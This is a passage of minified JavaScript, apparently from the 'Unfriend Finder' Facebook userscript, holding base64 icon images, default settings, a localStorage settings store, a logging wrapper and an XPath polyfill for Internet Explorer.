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",deactivated:"data:image/png;base64,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"},Facebox:{Fades:{Step:0.1,Timer:5},Langs:true},Beeper:{enabled:true,timer:7,unfriend:true,ignored:true,deactivated:true,reappeared:true,settings:true,newversion:true,newfriend:false,messages:true},Logging:{times:true,errors:true,infos:true,warnings:true,debug:true,messages:true},Ajax:{Headers:{"Content-type":"application/x-www-form-urlencoded",Pragma:"no-cache"}},Paging:{},defaultHelps:{menubar:false,filter:false,awaitings:false,settings:false,oldList:false},defaultSettings:{deactivated:true,reappeared:true,accepted:true,ignored:true,icons:true,uid:false,displayBlocks:false,notifUnfriend:true,notifIgnored:true,webkitNotifications:false,updatePicture:true,hideInMenubar:false,onlyShowNewUnfriends:true,dissociateLists:true,showTime:true,logging:false,hideOwnUnfriends:true,paging:20,hideNub:false,newManagementLists:true,statistics:true},defaultLanguage:null,_0x4d22:"Unfriend Finder",filterName:"navItem_app_206839602691675",versionChanged:false,url:window.location.href,env:{},settings:{}},Strings={},ErrorHandler=function(exception,from){if(Console){Console.error(exception.constructor.name+(from?" from "+from:"")+" :\n"+exception.message+" :\n"+exception.stack)
}};function Extend(target,source){if(typeof source==="object"){var property;for(property in source){if(source.hasOwnProperty(property)){if(source[property]!=null){if(/Object/.test(source[property].constructor)){if(property in target){void (0)}else{target[property]={}}Extend(target[property],source[property])}else{try{target[property]=source[property]}catch(exception){new ErrorHandler(exception,"Extend()")}}}}}}return target}function ExtendNew(target,source){if(!target){target={}}if(typeof source==="object"){var property;
for(property in source){if(source.hasOwnProperty(property)){if(typeof source[property]==="object"){if(property in target){void (0)}else{target[property]={};ExtendNew(target[property],source[property])}}else{try{if(property in target){void (0)}else{target[property]=source[property]}}catch(exception){new ErrorHandler(exception,"ExtendNew()")}}}}}return target}var Console={time:function(str){if(!Params.debug){return}try{if(Params.Logging.times){console.time(str)}}catch(exception){}},error:function(str){if(!Params.debug){return
}try{if(Params.Logging.errors){console.error(str)}}catch(exception){}},info:function(str){if(!Params.debug){return}try{if(Params.Logging.infos){console.info(str)}}catch(exception){}},warn:function(str){if(!Params.debug){return}try{if(Params.Logging.warnings){console.warn(str)}}catch(exception){}},debug:function(str){if(!Params.debug){return}try{if(Params.Logging.debug){console.debug(str)}}catch(exception){}},log:function(str){if(!Params.debug){return}try{if(Params.Logging.messages){console.log(str)
}}catch(exception){}},timeEnd:function(str){if(!Params.debug){return}try{if(Params.Logging.times){console.timeEnd(str)}}catch(exception){}}};var Registry={setKey:function setKey(key,value){trace(key);try{if(!Params.env.isFirefox){return window.localStorage["unfriendfinder_"+key]=value}else{return GM_setValue(key,value)}}catch(exception){Console.error("Fatal error: Can't store value "+key)}},getKey:function getKey(key,defaultValue){trace(key);var value;try{if(!Params.env.isFirefox){value=window.localStorage["unfriendfinder_"+key];
if(typeof value=="undefined"){return defaultValue}else{return value}}else{try{value=GM_getValue(key);if(typeof value=="undefined"){return defaultValue}else{return value}}catch(exception){new ErrorHandler(exception,"getKey()")}}}catch(exception){Console.error("Fatal error: Can't get stored value "+key);return defaultValue}}};initEnv();footer();if((Params.env.isIE)&&(!document.evaluate)){document.DomL3XPathRelease="0.0.3.0";var XPathException=new (_XPathExceptionHandler);function _XPathExceptionHandler(){this.INVALID_EXPRESSION_ERR=51;
this.TYPE_ERR=52;this.NOT_IMPLEMENTED_ERR=-1;this.RUNTIME_ERR=-2;this.ThrowNotImplemented=function(message){ThrowError(this.NOT_IMPLEMENTED_ERR,"This functionality is not implemented.",message)};this.ThrowInvalidExpression=function(message){ThrowError(this.INVALID_EXPRESSION_ERR,"Invalid expression",message)};this.ThrowType=function(message){ThrowError(this.TYPE_ERR,"Type error",message)};this.Throw=function(message){ThrowError(this.RUNTIME_ERR,"Run-time error",message)};function ThrowError(code,description,message){var error=new Error(code,"DOM-L3-XPath "+document.DomL3XPathRelease+": "+description+(message?', "'+message+'"':""));
error.code=code;error.name="XPathException";throw error}}var DOMException=new (_DOMExceptionHandler);function _DOMExceptionHandler(){this.ThrowInvalidState=function(message){ThrowError(13,"The state of the object is no longer valid",message)};function ThrowError(code,description,message){var error=new Error(code,"DOM : "+description+(message?', "'+message+'"':""));error.code=code;error.name="DOMException";throw error}}function XPathExpression(expression,resolver){this.expressionString=expression;
this.resolver=resolver;this.evaluate=function(contextNode,type,result){return(result&&result.constructor==XPathResult?result.initialize(this,contextNode,resolver,type):new XPathResult(this,contextNode,resolver,type))};this.toString=function toString(){return"[XPathExpression]"}}function XPathNSResolver(node){this.node=node;this.lookupNamespaceURI=function(prefix){XPathException.ThrowNotImplemented();return null};this.toString=function toString(){return"[XPathNSResolver]"}}XPathResult.ANY_TYPE=0;XPathResult.NUMBER_TYPE=1;
XPathResult.STRING_TYPE=2;XPathResult.BOOLEAN_TYPE=3;XPathResult.UNORDERED_NODE_ITERATOR_TYPE=4;XPathResult.ORDERED_NODE_ITERATOR_TYPE=5;XPathResult.UNORDERED_SNAPSHOT_TYPE=6;XPathResult.ORDERED_SNAPSHOT_TYPE=7;XPathResult.ANY_UNORDERED_NODE_TYPE=8;XPathResult.FIRST_ORDERED_NODE_TYPE=9;function XPathResult(expression,contextNode,resolver,type){this.initialize=function(expression,contextNode,resolver,type){this._domResult=null;this._expression=expression;this._contextNode=contextNode;this._resolver=resolver;
if(type){this.resultType=type;this._isIterator=(type==XPathResult.UNORDERED_NODE_ITERATOR_TYPE||type==XPathResult.ORDERED_NODE_ITERATOR_TYPE||type==XPathResult.ANY_TYPE);this._isSnapshot=(type==XPathResult.UNORDERED_SNAPSHOT_TYPE||type==XPathResult.ORDERED_SNAPSHOT_TYPE);this._isNodeSet=type>XPathResult.BOOLEAN_TYPE}else{this.resultType=XPathResult.ANY_TYPE;this._isIterator=true;this._isSnapshot=false;this._isNodeSet=true}return this};this.initialize(expression,contextNode,resolver,type);this.getInvalidIteratorState=function getInvalidIteratorState(){return documentChangeDetected()||!this._isIterator
};this.getSnapshotLength=function getSnapshotLength(){if(!this._isSnapshot){XPathException.ThrowType("Snapshot is not an expected result type")}activateResult(this);return this._domResult.length};this.iterateNext=function iterateNext(){if(!this._isIterator){XPathException.ThrowType("Iterator is not an expected result type")}activateResult(this);if(documentChangeDetected()){DOMException.ThrowInvalidState("iterateNext")}return getNextNode(this)};this.snapshotItem=function snapshotItem(index){if(!this._isSnapshot){XPathException.ThrowType("Snapshot is not an expected result type")
}return getItemNode(this,index)};this.toString=function toString(){return"[XPathResult]"};this.getStringValue=function getStringValue(){if(this.resultType!=XPathResult.STRING_TYPE){XPathException.ThrowType("The expression can not be converted to return String")}return getNodeText(this)};this.getNumberValue=function getNumberValue(){if(this.resultType!=XPathResult.NUMBER_TYPE){XPathException.ThrowType("The expression can not be converted to return Number")}var number=parseInt(getNodeText(this));if(isNaN(number)){XPathException.ThrowType("The result can not be converted to Number")
}return number};this.getBooleanValue=function getBooleanValue(){if(this.resultType!=XPathResult.BOOLEAN_TYPE){XPathException.ThrowType("The expression can not be converted to return Boolean")}var text=getNodeText(this),bool=(text?text.toLowerCase():null);if(bool=="false"||bool=="true"){return bool}XPathException.ThrowType("The result can not be converted to Boolean")};this.getSingleNodeValue=function getSingleNodeValue(){if(this.resultType!=XPathResult.ANY_UNORDERED_NODE_TYPE&&this.resultType!=XPathResult.FIRST_ORDERED_NODE_TYPE){XPathException.ThrowType("The expression can not be converted to return single Node value")
}return getSingleNode(this)};function documentChangeDetected(){return document._XPathMsxmlDocumentHelper.documentChangeDetected()}function getNodeText(result){activateResult(result);return result._textResult}function findNode(result,current){switch(current.nodeType){case 1:var id=current.attributes.getNamedItem("id");if(id){return getFromId(id.value)}XPathException.Throw("unable to locate element in XML tree");case 2:var id=current.selectSingleNode("..").attributes.getNamedItem("id");if(id){var node=getFromId(id.text);
if(node){return node.attributes.getNamedItem(current.nodeName)}}XPathException.Throw("unable to locate attribute in XML tree");case 3:var id=current.selectSingleNode("..").attributes.getNamedItem("id");if(id){var node=getFromId(id.value);if(node){for(child in node.childNodes){if(child.nodeType==3&&child.nodeValue==current.nodeValue){return child}}}}XPathException.Throw("unable to locate text in XML tree")}XPathException.Throw("unknown node type")}function activateResult(result){if(!result._domResult){try{var expression=result._expression.expressionString;
if(result._contextNode!=document&&expression.indexOf("//")!=0){expression="//*[@id = '"+result._contextNode.id+"']"+(expression.indexOf("/")==0?"":"/")+expression}if(result._isNodeSet){result._domResult=document._XPathMsxmlDocumentHelper.getDom().selectNodes(expression)}else{result._domResult=true;result._textResult=document._XPathMsxmlDocumentHelper.getTextResult(expression)}}catch(error){XPathException.ThrowInvalidExpression(error.description)}}}function getSingleNode(result){var node=getItemNode(result,0);
result._domResult=null;return node}function getItemNode(result,index){activateResult(result);var current=result._domResult.item(index);return(current?findNode(result,current):null)}function getNextNode(result){var current=result._domResult.nextNode;if(current){return findNode(result,current)}result._domResult=null;return null}}document._XPathMsxmlDocumentHelper=new (_XPathMsxmlDocumentHelper);function _XPathMsxmlDocumentHelper(){this.getDom=function(){activateDom(this);return this.dom};this.getXml=function(){activateDom(this);
return this.dom.xml};this.getTextResult=function(expression){expression=expression.replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,'"');var xslText='<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:output method="text"/><xsl:template match="*"><xsl:value-of select="'+expression+'"/></xsl:template></xsl:stylesheet>';var xsl=new ActiveXObject("Msxml2.DOMDocument");xsl.loadXML(xslText);try{var result=this.getDom().transformNode(xsl)}catch(error){alert("Error: "+error.description)
}return result};this.reset=function(){this.dom=null};function onPropertyChangeEventHandler(){document._propertyChangeDetected=true}this.documentChangeDetected=function(){return(document.ignoreDocumentChanges?false:this._currentElementCount!=document.all.length||document._propertyChangeDetected)};function activateDom(helper){if(!helper.dom){var dom=new ActiveXObject("Msxml2.DOMDocument");dom.async=false;dom.resolveExternals=false;loadDocument(dom,helper);helper.dom=dom;helper._currentElementCount=document.all.length;
document._propertyChangeDetected=false}else{if(helper.documentChangeDetected()){var dom=helper.dom;dom.load("");loadDocument(dom,helper);helper._currentElementCount=document.all.length;document._propertyChangeDetected=false}}}function loadDocument(dom,helper){return loadNode(dom,dom,Params.body,helper)}function loadNode(dom,domParentNode,node,helper){if(node.nodeType==3){domParentNode.appendChild(dom.createTextNode(node.nodeValue))}else{var domNode=dom.createElement(node.nodeName.toLowerCase());if(!node.id){node.id=node.uniqueID
}domParentNode.appendChild(domNode);loadAttributes(dom,domNode,node);var length=node.childNodes.length;for(var i=0;i<length;i++){loadNode(dom,domNode,node.childNodes[i],helper)}node.attachEvent("onpropertychange",onPropertyChangeEventHandler)}}function loadAttributes(dom,domParentNode,node){for(var i=0;i<node.attributes.length;i++){var attribute=node.attributes[i];var attributeValue=attribute.nodeValue;if(attributeValue&&attribute.specified){var domAttribute=dom.createAttribute(attribute.nodeName);
domAttribute.value=attributeValue;domParentNode.setAttributeNode(domAttribute)}}}}document.reloadDom=function(){document._XPathMsxmlDocumentHelper.reset()};document.createExpression=function(expression,resolver){return new XPathExpression(expression,resolver)};document.createNSResolver=function(nodeResolver){return new XPathNSResolver(nodeResolver)};document.evaluate=function(expression,contextNode,resolver,type,result){return document.createExpression(expression,resolver).evaluate(contextNode,type,result)
